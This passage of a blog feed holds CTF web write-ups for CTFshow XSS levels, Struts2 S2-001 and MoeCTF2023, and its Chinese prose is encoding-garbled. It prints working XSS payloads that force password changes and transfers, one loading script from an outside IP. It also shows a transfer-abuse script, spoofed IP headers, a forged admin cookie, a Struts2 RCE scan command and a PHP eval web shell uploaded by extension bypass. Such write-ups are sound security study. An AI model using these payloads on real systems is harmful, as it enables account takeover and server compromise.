punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://127.0.0.1/api/change.php?p=111'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>ÁÑ∂ÂêéÁôªÂΩïadminÂ∞±ÂèØ‰ª•‰∫Ü</p><h4 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h4><p>Âíå‰∏äÈ¢òÁ±ª‰ººÔºåÊàë‰ª¨ÂÖàÊäìÂåÖÂàÜÊûê„ÄÇËøôÊ¨°‰øÆÊîπÂØÜÁ†ÅÂèòÊàê‰∫ÜPOSTËØ∑Ê±Ç„ÄÇ</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">"api/change.php"</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">'p'</span><span class="token operator">:</span><span class="token string">'111'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h4 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h4><p>ËøôÊ¨°Â§ö‰∫ÜÂèØ‰ª•ËΩ¨Ë¥¶ÁöÑÂäüËÉΩ</p><p>ËØ¥ÊòØÂèØ‰ª•ÂêëÂà´‰∫∫ËΩ¨Ë¥üÊï∞Ôºå‰ΩÜÊòØÊàëËøôÂÑøÂ∞±ÊòØÊúâÂÜÖÈ¨ºÔºåÂÅúÊ≠¢‰∫§ÊòìüòÖ</p><p>ÊâÄ‰ª•Âà©Áî®xss</p><blockquote><p>jqueryÁöÑËøô‰∏™ajax‰∏çËÉΩÊê∫Â∏¶cookieËØ∑Ê±ÇÔºåÊâÄ‰ª•ÊúâÁÇπÈ∫ªÁÉ¶Ôºå‰ΩÜÊòØÂ¶ÇÊûúÊòØÊú¨Âú∞ËØ∑Ê±ÇÂ∞±ÂàöÂ•ΩÁªïËøá‰∫ÜËøô‰∏ÄÁÇπ</p></blockquote><pre class="language-javascript" data-language="javascript"><code class="language-javascript">$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"http://127.0.0.1/api/amount.php"</span><span class="token punctuation">,</span><span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">'u'</span><span class="token operator">:</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token string-property property">'a'</span><span class="token operator">:</span><span class="token number">10000</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token literal-property property">cache</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://117.72.70.186/xs5/post.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>Âú®Ê≥®ÂÜåÁïåÈù¢Â°´ÂÖ•payload</p><p>ÁÑ∂ÂêéÊâæ‰∏™testË¥¶Âè∑Êî∂Èí±</p><h4 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h4><p>332ÁöÑÊñπÊ≥ïÁÖßÊ†∑ÂèØ‰ª•</p><p>‰πüÂèØ‰ª•ËΩ¨Ë¥¶ÁªôËá™Â∑±ÔºåËÄå‰∏îÂæó‰øùËØÅËá™Â∑±ÊúÄ‰ΩéÊúâ1ÂùóÈí±ÔºåÂÜô‰∏™ËÑöÊú¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> timex<span class="token operator">=</span><span class="token number">5</span>url<span class="token operator">=</span><span class="token string">"http://f6d9355e-3521-4f14-b1f7-c6bbe137790d.challenge.ctf.show/api/amount.php"</span>url2<span class="token operator">=</span><span class="token string">"http://f6d9355e-3521-4f14-b1f7-c6bbe137790d.challenge.ctf.show/api/getFlag.php"</span>headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token string">'PHPSESSID=3o54ih5njfm1hh1ccnet28e59b'</span><span class="token punctuation">&#125;</span>  <span class="token comment">#Ëá™Â∑±ÁôªÂΩïÂêéÁöÑsessionid</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    t<span class="token operator">=</span>x<span class="token operator">-</span><span class="token number">1</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'u'</span><span class="token punctuation">:</span><span class="token string">'hsad'</span><span class="token punctuation">,</span> <span class="token comment">#Ê≥®ÂÜåÁöÑÁî®Êà∑Âêç</span>    <span class="token string">'a'</span><span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">></span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r2<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r2<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span>    x<span class="token operator">+=</span>t</code></pre>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webÂÖ•Èó®-Java</title>
      <link href="/2024/07/18/web%E5%85%A5%E9%97%A8-Java/"/>
      <url>/2024/07/18/web%E5%85%A5%E9%97%A8-Java/</url>
      
        <content type="html"><![CDATA[<h3 id="web279-300"><a href="#web279-300" class="headerlink" title="web279-300"></a>web279-300</h3><p><a href="https://www.secrss.com/articles/24780">Âè≤‰∏äÊúÄÂÖ®Struts 2ÊºèÊ¥ûÂ§çÁé∞ËøáÁ®ãÂèäPoCÂêàÈõÜ</a></p><h4 id="web279-struts2ÊºèÊ¥û-S2-001"><a href="#web279-struts2ÊºèÊ¥û-S2-001" class="headerlink" title="web279(struts2ÊºèÊ¥û S2-001)"></a>web279(struts2ÊºèÊ¥û S2-001)</h4><p><a href="https://www.freebuf.com/column/224041.html">VulhubÊºèÊ¥ûÁ≥ªÂàóÔºöstruts2ÊºèÊ¥û S2-001</a></p><p>ÂàöÂºÄÂßãÂè™Â≠¶‰∫ÜÂü∫Á°ÄÁöÑJavaÁ±ªÔºåPoc‰∏≠ÁöÑ‰∏Ä‰∫õÊûÑÈÄ†ÊñπÊ≥ïËøòÊú™Êé•Ëß¶ÔºåÊâÄ‰ª•ÂàöÂºÄÂßãÁî®‰∫Ü<a href="https://github.com/wyzmgmdg/Struts2Scan">Struts2Scan</a>ÈÄöÊùÄËÑöÊú¨</p><p>Ê£ÄÊµãÔºö</p><pre class="language-bash" data-language="bash"><code class="language-bash">python Struts2Scan.py <span class="token parameter variable">-u</span> http://08c8e9cf-4a7b-458f-b75b-2f2bdeae6c1b.chall.ctf.show:8080/S2-001/login.action</code></pre><p>Âà©Áî®Ôºö</p><pre class="language-bash" data-language="bash"><code class="language-bash">python Struts2Scan.py <span class="token parameter variable">-u</span> http://22350c9d-7de9-4d0c-9e56-b26cd771f1dd.challenge.ctf.show/S2-001/login.action <span class="token parameter variable">-n</span> S2-001 <span class="token parameter variable">--exec</span></code></pre><p>ÊâßË°åÂëΩ‰ª§envÂç≥ÂèØÂæóÂà∞flag</p><p><strong>ËøôÈõÜË¥∏Â§™Èöæ‰∫ÜÔºåÂÖàÁºìÁºì</strong></p>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> CTFshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF2023-web</title>
      <link href="/2024/07/14/MoeCTF2023-web/"/>
      <url>/2024/07/14/MoeCTF2023-web/</url>
      
        <content type="html"><![CDATA[<h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><pre class="language-php" data-language="php"><code class="language-php">this is <span class="token constant">GET</span> method<span class="token punctuation">,</span>         your mission<span class="token punctuation">:</span>        <span class="token number">1.</span><span class="token keyword">use</span> <span class="token package">parameter</span><span class="token punctuation">:</span> UwU<span class="token operator">=</span>u        <span class="token number">2.</span>post <span class="token operator">**</span>form<span class="token operator">**</span><span class="token punctuation">:</span> Luv<span class="token operator">=</span>u        <span class="token number">3.</span><span class="token keyword">use</span> <span class="token package">admin</span> character        <span class="token number">4.</span>request from <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>        <span class="token number">5.</span><span class="token keyword">use</span> <span class="token package">browser</span> <span class="token string single-quoted-string">'MoeBrowser'</span>        Complete All Missions</code></pre><p>ËÄÉÂØüÂü∫Á°ÄÁöÑhttpÂçèËÆÆ</p><p><img src="easy.png" loading="lazy"></p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">NewStarCTF2023</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">28</span></span><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://example.com</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">newstarctf.com</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">power=ctfer</span></span><span class="token header"><span class="token header-name keyword">X-Real-Ip</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Client-Ip</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>secret=n3wst4rCTF2023g00000d‰º™ÈÄ†IP<span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Client-ip</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Client-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Remote-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Rriginating-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Remote-addr</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">HTTP_CLIENT_IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Real-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Originating-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">via</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1  ‰ª£ÁêÜ</span></span></code></pre><h4 id="webÂÖ•Èó®ÊåáÂåó"><a href="#webÂÖ•Èó®ÊåáÂåó" class="headerlink" title="webÂÖ•Èó®ÊåáÂåó"></a>webÂÖ•Èó®ÊåáÂåó</h4><p>ÊñáÊú´Êúâ‰∏Ä‰∏≤ÂØÜÊñá</p><p>666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c5131524758316379596c396a61474673624756755a3055684958303d</p><p>ËøôÊòØ‰∏Ä‰∏≤16ËøõÂà∂ÁºñÁ†ÅÔºåËß£Á†ÅÂæóÂà∞</p><p>bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0&#x3D;</p><p>flagÁöÑÂÜÖÂÆπËß£Á†ÅÂæóÂà∞</p><p>moectf{w3lCome_To_moeCTF_W2b_challengE!!}</p><h4 id="ÂΩºÂ≤∏ÁöÑflag"><a href="#ÂΩºÂ≤∏ÁöÑflag" class="headerlink" title="ÂΩºÂ≤∏ÁöÑflag"></a>ÂΩºÂ≤∏ÁöÑflag</h4><p>F12Ê∫êÁ†Å‰∏≠Ë¢´Êí§ÂõûÁöÑÊ∂àÊÅØÈÇ£ÈáåÊúâflag</p><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>ÈôÑ‰ª∂‰∏≠Êúâ‰∏Ä‰∫õapiËØ¥Êòé</p><p>Ê≥®ÂÜå <code>POST /register</code></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"koito"</span><span class="token punctuation">,</span>    <span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"123456"</span><span class="token punctuation">&#125;</span></code></pre><p>ÁôªÂΩï <code>POST /login</code></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"koito"</span><span class="token punctuation">,</span>    <span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"123456"</span><span class="token punctuation">&#125;</span></code></pre><p>Ëé∑Âèñflag <code>GET /flag</code></p><p>Êü•ËØ¢ÊúçÂä°Áä∂ÊÄÅ &#96;GET &#x2F;status</p><p>ÊåâÁÖßÊµÅÁ®ãÊ≥®ÂÜåÂπ∂ÁôªÈôÜÂêéÔºåËøîÂõû‰∫ÜCookie</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">token=eyJ1c2VybmFtZSI6ICJoc2FkIiwgInBhc3N3b3JkIjogIjEyMzQ1NiIsICJyb2xlIjogInVzZXIifQ==;</span></span>base64decodeÔºö&#123;"username": "hsad", "password": "123456", "role": "user"&#125;</code></pre><p>Â∞Ü<code>role</code>Êîπ‰∏∫adminÂπ∂‰Ωú‰∏∫CookieËÆøÈóÆ&#x2F;flagÂæóÂà∞flag</p><h4 id="gas-gas-gas-Spider"><a href="#gas-gas-gas-Spider" class="headerlink" title="gas!gas!gas!(Spider)"></a>gas!gas!gas!(Spider)</h4><p>Â¶Ç‰ΩïÊºÇÁßª</p><ol><li>Ê≤πÈó®Â§ßËΩÆËÉéËΩ¨ÈÄüÈ´òÁ©∫ËΩ¨ÔºåÊäìÂú∞ÂäõÂ∞±Â∞èÔºåÂèç‰πãÊäìÂú∞ÂäõÂ§ß</li><li>‰øùÊåÅÂèçÊâìÔºåÊ†πÊçÆÂºØÊñπÂêëÊèêÁ§∫ÔºåÂèçÊâìÂèçÂêë</li><li>Âú®0.5sÂÜÖÂø´ÈÄüÂèçÂ∫îÔºåÂπ∂ÂùöÊåÅ‰∏ãÊù•‰∫îËΩÆ</li><li>ÈáçÊñ∞Èöè‰æøÊèê‰∫§‰∏ÄÊ¨°Êìç‰ΩúÊù•ÈáçÊñ∞ÂºÄÂßã</li></ol><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;form action&#x3D;&quot;&#x2F;&quot; method&#x3D;&quot;POST&quot;&gt;   &lt;label for&#x3D;&quot;driver&quot;&gt;ÈÄâÊâã:&lt;&#x2F;label&gt;   &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;driver&quot; name&#x3D;&quot;driver&quot; required&gt;&lt;br&gt;&lt;br&gt;      &lt;label for&#x3D;&quot;steering_control&quot;&gt;ÊñπÂêëÊéßÂà∂:&lt;&#x2F;label&gt;   &lt;select id&#x3D;&quot;steering_control&quot; name&#x3D;&quot;steering_control&quot; required&gt;     &lt;option value&#x3D;&quot;-1&quot;&gt;Â∑¶&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;0&quot; selected&gt;Áõ¥Ë°å&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;1&quot;&gt;Âè≥&lt;&#x2F;option&gt;   &lt;&#x2F;select&gt;&lt;br&gt;&lt;br&gt;   &lt;label for&#x3D;&quot;throttle&quot;&gt;Ê≤πÈó®ÊéßÂà∂:&lt;&#x2F;label&gt;   &lt;select id&#x3D;&quot;throttle&quot; name&#x3D;&quot;throttle&quot; required&gt;     &lt;option value&#x3D;&quot;0&quot;&gt;ÊùæÂºÄ&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;1&quot;&gt;‰øùÊåÅ&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;2&quot; selected&gt;ÂÖ®ÂºÄ&lt;&#x2F;option&gt;   &lt;&#x2F;select&gt;&lt;br&gt;&lt;br&gt;      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Êèê‰∫§&quot;&gt; &lt;&#x2F;form&gt;</code></pre><p>Ê†πÊçÆËøîÂõûÁöÑÊèêÁ§∫Êù•ÊîπÂèòÊØèÊ¨°ËµõËΩ¶ÁöÑÊìç‰ΩúÔºå‰∏çËøáÊúâÊó∂Èó¥ÈôêÂà∂ÔºåÊâÄ‰ª•Ë¶ÅÁºñÂÜôËÑöÊú¨ÂÆåÊàê</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">'http://localhost:3906/'</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>post_data <span class="token operator">=</span> <span class="token string">"driver=hsad&amp;steering_control=0&amp;throttle=0&#125;"</span>post <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    url<span class="token operator">=</span>url<span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>post_data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>    headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;h3>&lt;font color="red">(.*)&lt;/font>&lt;/h3>&lt;/div>'</span><span class="token punctuation">,</span> post<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>steering_control <span class="token operator">=</span> <span class="token number">0</span>throttle <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'ÂºØÈÅìÂêëÂ∑¶'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'ÂºØÈÅìÂêëÂè≥'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'ÂºØÈÅìÁõ¥Ë°å'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">if</span> <span class="token string">'‰øùÊåÅËøô‰∏™ÈÄüÂ∫¶'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'ÊäìÂú∞ÂäõÂ§™Â§ß‰∫Ü'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">if</span> <span class="token string">'ÊäìÂú∞ÂäõÂ§™Â∞è‰∫Ü'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">0</span>    steering_control_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'-1'</span><span class="token punctuation">:</span> <span class="token string">'Â∑¶'</span><span class="token punctuation">,</span>        <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'Áõ¥Ë°å'</span><span class="token punctuation">,</span>        <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'Âè≥'</span>    <span class="token punctuation">&#125;</span>    throttle_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'ÊùæÂºÄ'</span><span class="token punctuation">,</span>        <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'‰øùÊåÅ'</span><span class="token punctuation">,</span>        <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">'ÂÖ®ÂºÄ'</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>steering_control_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>steering_control<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>throttle_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>throttle<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    post <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>        url<span class="token operator">=</span>url<span class="token punctuation">,</span>        data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'driver=hsad&amp;steering_control=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>steering_control<span class="token punctuation">&#125;</span></span><span class="token string">&amp;throttle=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>throttle<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>        headers<span class="token operator">=</span>headers    <span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'moectf'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'moectf(.*)'</span><span class="token punctuation">,</span> post<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">-6]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;h3>&lt;font color="red">(.*)&lt;/font>&lt;/h3>'</span><span class="token punctuation">,</span> post<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    </code></pre><h4 id="moeÂõæÂ∫ä-Êñá‰ª∂‰∏ä‰º†"><a href="#moeÂõæÂ∫ä-Êñá‰ª∂‰∏ä‰º†" class="headerlink" title="moeÂõæÂ∫ä(Êñá‰ª∂‰∏ä‰º†)"></a>moeÂõæÂ∫ä(Êñá‰ª∂‰∏ä‰º†)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">const</span> allowedExtensions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>           <span class="token keyword">const</span> <span class="token constant">fileExtension</span> <span class="token operator">=</span> file<span class="token operator">.</span>name<span class="token operator">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedExtensions<span class="token operator">.</span><span class="token function">includes</span><span class="token punctuation">(</span>fileExtension<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Âè™ÂÖÅËÆ∏‰∏ä‰º†ÂêéÁºÄÂêç‰∏∫pngÁöÑÊñá‰ª∂ÔºÅ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">return</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span></code></pre><p>ÂÆ°ËÆ°Ê∫êÁ†ÅÊó∂ÂèëÁé∞ÔºåÂè™ÊòØÁÆÄÂçïÁöÑÁî®<code>.</code>‰Ωú‰∏∫ÂàÜÈöîÂà§Êñ≠‰∫ÜÁ¨¨‰∏Ä‰∏™ÂêéÁºÄÂêçÔºå‰∫éÊòØ‰∏ä‰º†</p><pre class="language-php" data-language="php"><code class="language-php">1.png.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'attack'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>GET: http://localhost:6472/uploads/1.png.phpPOST: attack=system('tac /flag');</code></pre><h4 id="Â§ßÊµ∑ÊçûÈíà"><a href="#Â§ßÊµ∑ÊçûÈíà" class="headerlink" title="Â§ßÊµ∑ÊçûÈíà"></a>Â§ßÊµ∑ÊçûÈíà</h4><p>ÊâìÂºÄÈ¢òÁõÆÂèØËßÅÂè™ÈúÄË¶ÅbpË∑ë‰∏ÄÂà∞‰∏ÄÂçÉÁöÑÊï∞Â≠óÂç≥ÂèØ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">use</span> <span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">&lt;</span><span class="token number">1</span><span 